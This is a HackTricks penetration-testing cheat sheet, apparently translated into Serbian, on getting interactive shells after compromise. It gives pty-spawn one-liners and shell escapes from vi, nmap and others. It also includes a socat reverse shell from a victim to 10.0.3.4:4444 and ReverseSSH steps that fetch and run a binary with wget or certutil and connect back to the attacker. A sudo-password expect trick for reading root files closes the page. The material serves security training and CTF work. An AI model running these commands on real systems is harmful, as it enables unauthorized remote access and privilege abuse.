# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Napomena: ljuska koju postavite u `SHELL` varijabli **mora** biti **navedena unutar** _**/etc/shells**_ ili `Vrednost za SHELL varijablu nije pronađena u /etc/shells datoteci Ovaj incident je prijavljen`. Takođe, imajte na umu da sledeći snippeti rade samo u bash-u. Ako ste u zsh, pređite na bash pre nego što dobijete ljusku pokretanjem `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Možete dobiti **broj** **redova** i **kolona** izvršavanjem **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Pokretanje ljuski**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Pogodan način za **interaktivni pristup ljusci**, kao i **prenos fajlova** i **prosleđivanje portova**, je postavljanje statički povezanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.

Ispod je primer za `x86` sa upx-kompresovanim binarnim datotekama. Za druge binarne datoteke, proverite [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Pripremite lokalno da uhvatite zahtev za prosleđivanje ssh porta:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux cilj:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 cilj (za ranije verzije, proverite [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Ako je zahtev za preusmeravanje porta ReverseSSH bio uspešan, sada biste trebali moći da se prijavite sa podrazumevanom lozinkom `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatski unapređuje Linux reverse shells u TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Ako iz nekog razloga ne možete dobiti pun TTY, **i dalje možete interagovati sa programima** koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje `sudo` da bi se pročitala datoteka:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
